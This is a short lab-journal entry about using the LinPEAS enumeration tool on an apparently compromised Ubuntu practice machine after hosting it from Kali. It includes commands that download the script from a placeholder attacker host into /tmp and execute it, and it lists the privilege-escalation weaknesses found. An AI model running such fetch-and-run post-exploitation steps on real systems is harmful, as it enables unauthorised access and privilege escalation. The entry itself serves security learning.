# 🔍 Day 8: Privilege Escalation Enumeration (LinPEAS)

## 📝 Executive Summary
Now that I understand basic privilege escalation, today I focused on the reconnaissance phase of post-exploitation. Instead of manually guessing misconfigurations, I used **LinPEAS**, an automated enumeration tool designed to highlight privilege escalation paths on Linux systems.

Using it on the compromised Ubuntu machine showed me how an attacker systematically discovers weaknesses — much more realistic than relying on obvious sudo errors.

---

## 🧪 Technical Steps

### 1. Hosting LinPEAS on Kali
I downloaded LinPEAS and hosted it over a simple Python web server:

```bash
curl -LO https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
sudo python3 -m http.server 80
```

### 2. Downloading & Running It on the Ubuntu Target
On the victim system:

```bash
cd /tmp
wget http://<kali-ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 3. Findings
LinPEAS flagged multiple items:

- sudo misconfigurations  
- world-writable paths  
- potential PATH hijacking opportunities  
- service misconfigurations  

This gave me a clear picture of why enumeration is necessary — it reveals things I’d never spot manually.

---

